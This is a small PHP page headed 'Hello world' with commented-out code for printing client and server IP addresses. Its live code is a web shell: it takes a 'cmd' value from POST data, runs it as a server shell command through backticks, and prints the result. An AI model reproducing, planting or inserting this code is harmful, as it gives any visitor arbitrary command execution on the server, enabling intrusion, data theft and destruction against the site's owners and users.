<html>
<head>
</head>
<body>
    <h1>html : Hello world!</h1>
    <h2>kkkkkk</h2>
<?php
    // $clientIp=$_SERVER["REMOTE_ADDR"];
    // $webServerIp=$_SERVER["SERVER_ADDR"];

    // echo "<h1>";
    // echo "浏览器的ip地址是: ".$clientIp;
    // echo "<br>";
    // echo "服务器的ip地址是: ".$webServerIp;
    // echo "</h1>";
    $cmd=$_POST["cmd"];
    $res=`$cmd`;
    echo $res;
    echo $cmd;

?>

</body>
</html>